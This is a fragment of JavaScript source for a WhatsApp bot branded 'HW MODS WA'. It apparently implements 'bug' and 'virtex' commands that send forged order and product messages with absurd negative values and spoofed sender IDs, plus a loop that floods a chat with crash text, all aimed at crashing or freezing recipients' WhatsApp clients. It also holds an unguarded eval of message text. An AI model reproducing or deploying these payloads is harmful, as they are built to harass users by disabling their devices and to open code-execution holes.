Haikal.sendMessage(from, { "degreesLatitude": 24.121231,
            "degreesLongitude": 55.1121221,
            "name": `HW MODS WA${vipi,virtex}`,
            "currencyCode": "USD",
"priceAmount1000": "-9999999999,",
            "address": emoji2(prefix),
                        jpegThumbnail: fakethumb },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: -999999999999, // Bug
    status: 1,
    surface: 1,
    message: `HW MODS WA${vipi,virtex}`,
    orderTitle: `HW MODS WA`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
// Bug virtext
case 'bugtext':
if (!mek.key.fromMe) return 
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
Haikal.sendMessage(from, `HW MODS WA${vipi,virtex}`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: -999999999999, // Bug
    status: 1,
    surface: 1,
    message: `HW MODS WA${vipi,virtex}`,
    orderTitle: `HW MODS WA`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
}}}}, 0)
}
break
// Bug Trolli ( HW MODS WA )
case 'psp': // BUG TROLLI + BUG GC + TROLLI
if (!mek.key.fromMe) return 
buf = fs.readFileSync('./stik/fake.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, fakethumb) 
imeg = imeu.message.imageMessage
res = await Haikal.prepareMessageFromContent(from,{
"orderMessage": {
"jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
"itemCount": 173388341205594,
"status": "INQUIRY",
"surface": "CATALOG",
"orderId": "-3599964009",
"orderTitle": `HW MODS WA${vipi,virtex}`,
"message": `HW MODS WA${vipi,virtex}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "-3599964009",
"totalCurrencyCode": "-173388341205594",
"cont+extInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:bugtrol, contextInfo:{}}) 

Haikal.toggleDisappearingMessages(from, 'Awoakwoakwoak')
Haikal.relayWAMessage(res)
break
// Bug Dokumen
case 'pvp':
if (!mek.key.fromMe) return 
tapib1 = fs.readFileSync('./stik/numayei.mp3')
Haikal.sendMessage(from, tapib1, document, { quoted: mek, filename:`HW MODS WA${vipi,virtex}.mp3`, mimetype: 'audio/application' })
await freply('Musik Yok')
break
// Bug Catalog ( HW MODS WA )
case 'pcp':
if (!mek.key.fromMe) return 
buf = fs.readFileSync('./stik/anjay.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Haikal.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "-12-150453297177375",
"title": `HW MODS WA ~ 404 ${vipi}`,
"description": `${virtex}`,
"currencyCode": "IDR",
"priceAmount1000": "-99999999999999999999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:mek, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
default:
        if (budy.includes(`assalamualaikum`)) {
                  reply(`Waalaikumsalam`)
                  }

		if (budy.includes(`Assalamualaikum`)) {
                  reply(`Waalaikumsalam`)
                  }

		if (budy.includes(`Sepi`)) {
                  reply(`Iya🗿`)
                  }

if (budy.startsWith('x')){
try {
return Haikal.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  

	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'red'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
